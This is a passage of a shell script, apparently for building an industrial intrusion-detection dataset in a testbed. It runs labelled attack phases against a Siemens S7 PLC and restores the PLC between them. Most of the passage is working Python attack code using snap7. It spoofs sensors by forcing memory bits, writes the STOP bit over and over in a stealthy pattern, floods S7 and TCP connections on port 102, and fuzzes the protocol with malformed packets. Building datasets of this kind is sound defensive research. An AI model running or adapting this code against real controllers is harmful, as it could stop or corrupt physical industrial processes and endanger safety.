        wait_s 1200 "SETPOINT_ATTACK"
        kill "$SP2" 2>/dev/null || true
        restore_plc
        label "SETPOINT_ATTACK" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 6. SENSOR_SPOOF (20m)
        label "SENSOR_SPOOF" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[SPOOF] Fixing Vat1=Vat2=Vat3=1 (sensors always ON)', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 5, 2)
        set_bool(m, 0, 4, 1)   # M5.4 Vat1 = 1
        set_bool(m, 0, 6, 1)   # M5.6 Vat2 = 1
        set_bool(m, 1, 0, 1)   # M6.0 Vat3 = 1
        c.write_area(Areas.MK, 0, 5, m)
        n += 1
        if n % 100 == 0:
            print(f'[SPOOF] #{n} writes: Vat1=Vat2=Vat3=1', flush=True)
    except: pass
    time.sleep(0.5)
PYEOF
        SS2=$!; PIDS+=("$SS2")
        wait_s 1200 "SENSOR_SPOOF"
        kill "$SS2" 2>/dev/null || true
        restore_plc
        label "SENSOR_SPOOF" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 7. STEALTHY_WRITE (10m)
        label "STEALTHY_WRITE" "START"
        $PY_CMD - <<PYEOF &
import snap7, time
try:    from snap7.type import Areas
except: from snap7.types import Areas
from snap7.util import set_bool
c = snap7.client.Client()
c.connect('$TARGET_IP', 0, 1)
n = 0
print('[STEALTHY] Low-and-slow: setting M5.1 (STOP) every 2s', flush=True)
while True:
    try:
        if not c.get_connected(): c.connect('$TARGET_IP', 0, 1)
        m = c.read_area(Areas.MK, 0, 5, 1)
        set_bool(m, 0, 1, 1)   # M5.1 STOP = 1
        c.write_area(Areas.MK, 0, 5, m)
        n += 1
        if n % 15 == 0:
            print(f'[STEALTHY] #{n} writes: M5.1=STOP=1', flush=True)
    except: pass
    time.sleep(2)
PYEOF
        SW2=$!; PIDS+=("$SW2")
        wait_s 600 "STEALTHY_WRITE"
        kill "$SW2" 2>/dev/null || true
        restore_plc
        label "STEALTHY_WRITE" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 8. S7_FLOOD (10m)
        label "S7_FLOOD" "START"
        $PY_CMD - <<PYEOF &
import snap7, time, threading
n_ok = 0; n_fail = 0
lock = threading.Lock()
def flood_worker():
    global n_ok, n_fail
    while True:
        try:
            c = snap7.client.Client()
            c.connect('$TARGET_IP', 0, 1)
            time.sleep(0.1)
            c.disconnect()
            with lock:
                n_ok += 1
        except:
            with lock: n_fail += 1
threads = [threading.Thread(target=flood_worker, daemon=True) for _ in range(8)]
for t in threads: t.start()
for t in threads: t.join()
PYEOF
        FP2=$!; PIDS+=("$FP2")
        wait_s 600 "S7_FLOOD"
        kill "$FP2" 2>/dev/null || true
        restore_plc
        label "S7_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 9. SYN_FLOOD (10m)
        label "SYN_FLOOD" "START"
        $PY_CMD - <<PYEOF &
import socket, threading
def syn_worker():
    while True:
        try:
            s = socket.socket()
            s.settimeout(0.05)
            s.connect(('$TARGET_IP', 102))
            s.close()
        except: pass
threads = [threading.Thread(target=syn_worker, daemon=True) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()
PYEOF
        SFP2=$!; PIDS+=("$SFP2")
        wait_s 600 "SYN_FLOOD"
        kill "$SFP2" 2>/dev/null || true
        restore_plc
        label "SYN_FLOOD" "END"

        label "BENIGN_NORMAL" "START"; wait_s 600 "recovery"; label "BENIGN_NORMAL" "END"

        # 10. PROTOCOL_FUZZ (10m)
        label "PROTOCOL_FUZZ" "START"
        $PY_CMD - <<PYEOF &
import socket, os, time
n = 0
while True:
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(('$TARGET_IP', 102))
        tpkt = b'\x03\x00'
        payload = os.urandom(20)
        length = len(tpkt) + 2 + len(payload)
        pkt = tpkt + length.to_bytes(2, 'big') + payload
        s.send(pkt)
        s.close()
        n += 1
        if n % 50 == 0:
            print(f'[FUZZ] {n} malformed PDUs sent', flush=True)
    except: pass
    time.sleep(0.1)
PYEOF
        FZP2=$!; PIDS+=("$FZP2")
        wait_s 600 "PROTOCOL_FUZZ"
        kill "$FZP2" 2>/dev/null || true
        restore_plc
        label "PROTOCOL_FUZZ" "END"

        label "BENIGN_NORMAL" "START"; wait_s 3600 "cooldown"; label "BENIGN_NORMAL" "END"

    else
        echo "[ERROR] DAY='$DAY' không hợp lệ. Dùng 1-6."
        exit 1
    fi
}

# ================================================================
# MAIN — Phân luồng theo ROLE
# ================================================================
case "$ROLE" in
    controller) run_controller ;;
    attacker)   run_attacker   ;;
    *) echo "[ERROR] ROLE='$ROLE' không hợp lệ. Dùng 'controller' hoặc 'attacker'."; exit 1 ;;
esac

echo "=== DONE: day=$DAY  role=$ROLE ==="
